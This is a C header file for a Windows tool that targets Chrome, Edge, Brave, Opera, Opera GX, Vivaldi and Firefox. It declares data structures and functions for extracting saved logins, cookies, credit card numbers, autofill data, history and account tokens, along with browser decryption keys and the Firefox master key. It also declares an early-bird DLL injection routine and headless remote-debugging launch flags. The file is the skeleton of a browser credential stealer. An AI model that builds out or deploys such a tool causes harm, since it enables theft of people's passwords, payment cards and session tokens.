#pragma once
#ifndef EXE_HEADERS_H
#define EXE_HEADERS_H

#include <Windows.h>
#include <Shlwapi.h>
#include <strsafe.h>
#include <stdio.h>

#include "Common.h"

#pragma comment(lib, "shlwapi.lib")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define MAX_DISPLAY_COUNT               16                      // max to output if /all was not provided

#define INITIAL_ARRAY_CAPACITY          MAX_DISPLAY_COUNT       // the initial array length of each element. setting it to 'MAX_DISPLAY_COUNT' will avoid expanding the arrays if not using /all.

#define PIPE_THREAD_TIMEOUT             (1000 * 15)             // 15 seconds

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define STR_FIREFOX_PROGID              L"FirefoxURL"
#define STR_FIREFOX_REGKEY              L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe"
#define STR_FIREFOX_OUTPUT_FILE         "FireFoxData.json"

#define STR_OPERA_PROGID                L"OperaStable"
#define STR_OPERA_REGKEY                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Opera.exe"
#define STR_OPERA_OUTPUT_FILE           "OperaData.json"

#define STR_OPERA_GX_PROGID             L"OperaGXStable"
#define STR_OPERA_GX_REGKEY             L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Opera_GX.exe"
#define STR_OPERA_GX_OUTPUT_FILE        "OperaGxData.json"

#define STR_CHROME_PROGID               L"ChromeHTML"
#define STR_CHROME_REGKEY               L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
#define STR_CHROME_OUTPUT_FILE          "ChromeData.json"

#define STR_EDGE_PROGID                 L"MSEdgeHTM"
#define STR_EDGE_REGKEY                 L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe"
#define STR_EDGE_OUTPUT_FILE            "EdgeData.json"

#define STR_BRAVE_PROGID                L"BraveHTML"
#define STR_BRAVE_REGKEY                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe"
#define STR_BRAVE_OUTPUT_FILE           "BraveData.json"

#define STR_VIVALDI_PROGID              L"VivaldiHTM"
#define STR_VIVALDI_REGKEY              L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\vivaldi.exe"
#define STR_VIVALDI_OUTPUT_FILE         "VivaldiData.json"

#define STR_CHROMIUM_ARGS               L"--headless=new --disable-gpu --remote-debugging-port=9222 --disable-background-timer-throttling"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// Works For All Browsers
static inline LPCWSTR GetBrowserProgId(IN BROWSER_TYPE Browser)
{
    switch (Browser)
    {
        case BROWSER_CHROME:    return STR_CHROME_PROGID;
        case BROWSER_BRAVE:     return STR_BRAVE_PROGID;
        case BROWSER_EDGE:      return STR_EDGE_PROGID;
        case BROWSER_OPERA:     return STR_OPERA_PROGID;
        case BROWSER_OPERA_GX:  return STR_OPERA_GX_PROGID;
        case BROWSER_FIREFOX:   return STR_FIREFOX_PROGID;
        case BROWSER_VIVALDI:   return STR_VIVALDI_PROGID;
        default:                return NULL;
    }
}

// Works For All Browsers
static inline LPCWSTR GetBrowserRegKey(IN BROWSER_TYPE Browser)
{
    switch (Browser)
    {
        case BROWSER_CHROME:    return STR_CHROME_REGKEY;
        case BROWSER_BRAVE:     return STR_BRAVE_REGKEY;
        case BROWSER_EDGE:      return STR_EDGE_REGKEY;
        case BROWSER_OPERA:     return STR_OPERA_REGKEY;
        case BROWSER_OPERA_GX:  return STR_OPERA_GX_REGKEY;
        case BROWSER_FIREFOX:   return STR_FIREFOX_REGKEY;
        case BROWSER_VIVALDI:   return STR_VIVALDI_REGKEY;
        default:                return NULL;
    }
}

// Works For All Browsers
static inline LPCSTR GetBrowserOutputFile(IN BROWSER_TYPE Browser)
{
    switch (Browser)
    {
        case BROWSER_CHROME:    return STR_CHROME_OUTPUT_FILE;
        case BROWSER_BRAVE:     return STR_BRAVE_OUTPUT_FILE;
        case BROWSER_EDGE:      return STR_EDGE_OUTPUT_FILE;
        case BROWSER_OPERA:     return STR_OPERA_OUTPUT_FILE;
        case BROWSER_OPERA_GX:  return STR_OPERA_GX_OUTPUT_FILE;
        case BROWSER_FIREFOX:   return STR_FIREFOX_OUTPUT_FILE;
        case BROWSER_VIVALDI:   return STR_VIVALDI_OUTPUT_FILE;
        default:                return NULL;
    }
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _TOKEN_ENTRY
{
    LPSTR   pszService;
    PBYTE   pbToken;
    DWORD   dwTokenLen;
    PBYTE   pbBindKey;
    DWORD   dwBindKeyLen;
} TOKEN_ENTRY, *PTOKEN_ENTRY;

typedef struct _COOKIE_ENTRY
{
    LPSTR   pszHostKey;
    LPSTR   pszPath;
    LPSTR   pszName;
    INT64   llExpiresUtc;
    PBYTE   pbValue;
    DWORD   dwValueLen;
} COOKIE_ENTRY, *PCOOKIE_ENTRY;

typedef struct _LOGIN_ENTRY
{
    LPSTR   pszOriginUrl;
    LPSTR   pszActionUrl;
    LPSTR   pszUsername;
    PBYTE   pbPassword;
    DWORD   dwPasswordLen;
    INT64   llDateCreated;
    INT64   llDateLastUsed;
} LOGIN_ENTRY, *PLOGIN_ENTRY;

typedef struct _CREDIT_CARD_ENTRY
{
    LPSTR   pszNameOnCard;
    LPSTR   pszNickname;
    DWORD   dwExpirationMonth;
    DWORD   dwExpirationYear;
    INT64   llDateModified;
    PBYTE   pbCardNumber;
    DWORD   dwCardNumberLen;
} CREDIT_CARD_ENTRY, *PCREDIT_CARD_ENTRY;

typedef struct _AUTOFILL_ENTRY
{
    LPSTR   pszName;
    LPSTR   pszValue;
    INT64   llDateCreated;
    DWORD   dwCount;
} AUTOFILL_ENTRY, *PAUTOFILL_ENTRY;

typedef struct _HISTORY_ENTRY
{
    LPSTR   pszUrl;
    LPSTR   pszTitle;
    DWORD   dwVisitCount;
    INT64   llLastVisitTime;
} HISTORY_ENTRY, *PHISTORY_ENTRY;

typedef struct _BOOKMARK_ENTRY
{
    LPSTR   pszName;
    LPSTR   pszUrl;
    INT64   llDateAdded;
} BOOKMARK_ENTRY, *PBOOKMARK_ENTRY;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _FIREFOX_BROWSER_DATA
{
    PBYTE   pbMasterKey;
    DWORD   dwMasterKeyLen;
    LPSTR   szEmail;
    LPSTR   szUid;
    LPSTR   szSessionToken;
    LPSTR   szSyncOAuthToken;
    LPSTR   szProfileOAuthToken;
    LPSTR   szSendTabPrivateKey;
    LPSTR   szCloseTabPrivateKey;
    BOOL    bVerified;
} FIREFOX_BROWSER_DATA, * PFIREFOX_BROWSER_DATA;

typedef struct _CHROMIUM_DATA
{
    // App-Bound Key (V20)
    PBYTE                   pbAppBoundKey;
    DWORD                   dwAppBoundKeyLen;

    // DPAPI Key (V10)
    PBYTE                   pbDpapiKey;
    DWORD                   dwDpapiKeyLen;

    // Tokens
    PTOKEN_ENTRY            pTokens;
    DWORD                   dwTokenCount;
    DWORD                   dwTokenCapacity;

    // Cookies
    PCOOKIE_ENTRY           pCookies;
    DWORD                   dwCookieCount;
    DWORD                   dwCookieCapacity;

    // Logins
    PLOGIN_ENTRY            pLogins;
    DWORD                   dwLoginCount;
    DWORD                   dwLoginCapacity;

    // Credit Cards
    PCREDIT_CARD_ENTRY      pCreditCards;
    DWORD                   dwCreditCardCount;
    DWORD                   dwCreditCardCapacity;
    
    // Autofill
    PAUTOFILL_ENTRY         pAutofill;
    DWORD                   dwAutofillCount;
    DWORD                   dwAutofillCapacity;

    // History
    PHISTORY_ENTRY          pHistory;
    DWORD                   dwHistoryCount;
    DWORD                   dwHistoryCapacity;

    // Bookmarks
    PBOOKMARK_ENTRY         pBookmarks;
    DWORD                   dwBookmarkCount;
    DWORD                   dwBookmarkCapacity;

    // Firefox data ONLY
    PFIREFOX_BROWSER_DATA   pFireFoxBrsrData;

} CHROMIUM_DATA, *PCHROMIUM_DATA;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL GetBrowserPath(IN BROWSER_TYPE Browser, IN OUT LPWSTR szBrowserPath, IN DWORD dwSize);

BOOL InitializeChromiumData(IN OUT PCHROMIUM_DATA pChromiumData);

VOID FreeChromiumData(IN OUT PCHROMIUM_DATA pChromiumData);

BOOL InjectDllViaEarlyBird(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL AddTokenEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszService, IN PBYTE pbToken, IN DWORD dwTokenLen, IN PBYTE pbBindKey, IN DWORD dwBindKeyLen);

BOOL AddCookieEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszHostKey, IN LPCSTR pszPath, IN LPCSTR pszName, IN INT64 llExpiresUtc, IN PBYTE pbValue, IN DWORD dwValueLen);

BOOL AddLoginEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszOriginUrl, IN LPCSTR pszActionUrl, IN LPCSTR pszUsername, IN PBYTE pbPassword, IN DWORD dwPasswordLen, IN INT64 llDateCreated, IN INT64 llDateLastUsed);

BOOL AddCreditCardEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszNameOnCard, IN LPCSTR pszNickname, IN DWORD dwExpirationMonth, IN DWORD dwExpirationYear, IN INT64 llDateModified, IN PBYTE pbCardNumber, IN DWORD dwCardNumberLen);

BOOL AddAutofillEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszName, IN LPCSTR pszValue, IN INT64 llDateCreated, IN DWORD dwCount);

BOOL AddHistoryEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszUrl, IN LPCSTR pszTitle, IN DWORD dwVisitCount, IN INT64 llLastVisitTime);

BOOL AddBookmarkEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszName, IN LPCSTR pszUrl, IN INT64 llDateAdded);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL ExtractBookmarksFromFile(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractHistoryFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractAutofillFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractCreditCardsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractLoginsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractCookiesFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractRefreshTokenFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractOperaAccessTokensFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Firefox [ONLY]

BOOL ExtractMasterKeyFromKey4Db(IN OPTIONAL LPCSTR pszMasterPassword, OUT PBYTE* ppbMasterKey, OUT PDWORD pcbMasterKey);

BOOL ExtractFirefoxLogins(IN PBYTE pbMasterKey, IN DWORD cbMasterKey, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractFirefoxCookies(IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractFirefoxHistory(IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractFirefoxBookmarks(IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractFirefoxAutofill(IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractFirefoxAccountTokens(IN OUT PFIREFOX_BROWSER_DATA pFirefoxData);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL WriteChromiumDataToJson(IN PCHROMIUM_DATA pChromiumData, IN LPCSTR pszFilePath, IN BOOL bShowAll);


#endif // !EXE_HEADERS_H